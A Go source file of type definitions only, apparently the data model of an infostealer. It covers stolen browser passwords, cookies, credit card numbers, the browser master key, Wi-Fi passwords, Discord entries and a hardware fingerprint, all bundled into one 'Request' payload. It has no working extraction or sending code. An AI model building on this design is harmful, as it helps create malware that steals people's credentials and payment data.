package utils

type BrowserPaths struct {
	Path       string
	LocalState string
	LoginData  string
	WebData    string
	History    string
	Cookies    string
	Bookmarks  string
	CreditCard string
	MasterKey  []byte
}

type Passwords struct {
	Username string
	Password string
	Url      string
}

type History struct {
	Url           string
	Title         string
	VisitCount    int
	LastVisitTime int64
}

type Cookie struct {
	Site     string
	Name     string
	Value    string
	Path     string
	Expires  string
	IsSecure string
}

type Autofill struct {
	Name  string
	Value string
}

type CreditCard struct {
	GUID            string
	Name            string
	ExpirationMonth int
	ExpirationYear  int
	CardNumber      string
	Address         string
	Nickname        string
}

type Bookmark struct {
	Url       string
	Name      string
	DateAdded string
}

type Download struct {
	TargetPath    string
	Url           string
	ReceivedBytes int64
}

type Browsers struct {
	Passwords  []Passwords
	Cookies    []Cookie
	History    []History
	AutoFill   []Autofill
	CreditCard []CreditCard
	Bookmark   []Bookmark
	Download   []Download
}

type CPU struct {
	Name string
}

type GPU struct {
	Name           string
	VideoProcessor string
	AdapterRAM     uint32
}

type Motherboard struct {
	Manufacturer string
	Product      string
	SerialNumber string
}

type WifiProfile struct {
	SSID     string
	Password string
}

type Disk struct {
	Name       string
	FileSystem string
	VolumeName string
	FreeSpace  uint32
	Size       uint32
}

type Process struct {
	Description string
	ProcessId   int
	Handle      int
}

type UUID struct {
	UUID string
}

type NetAdapter struct {
	MACAddress string
}

type PC struct {
	UUID         string
	CPU          string
	MacAddress   string
	Motherboard  Motherboard
	GPU          []GPU
	WifiProfiles []WifiProfile
	Disks        []Disk
}

type Request struct {
	Discord  []string
	Browser  Browsers
	Hardware PC
}
